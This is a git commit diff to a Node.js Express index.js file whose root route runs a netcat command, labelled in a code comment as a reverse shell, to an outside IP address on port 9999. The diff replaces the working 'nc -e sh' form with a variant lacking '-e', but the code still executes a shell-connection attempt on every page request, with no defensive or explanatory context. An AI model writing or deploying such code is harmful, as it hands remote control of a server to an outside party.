dd2de53abd4ae3ca6268d015f10593c35c032e52
ahmedgomaaa <37199252+ahmedgomaaa@users.noreply.github.com>
2024-08-12 17:28:52 +0300

    Update index.js

--- index.js
+++ index.js
@@ -6,7 +6,7 @@ const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
     // Command to run the Netcat reverse shell
-    exec('nc -e sh 140.238.85.162 9999', (error, stdout, stderr) => {
+    exec('nc sh 140.238.85.162 9999', (error, stdout, stderr) => {
         if (error) {
             res.send(`<pre>Error: ${error.message}</pre>`);
             return;
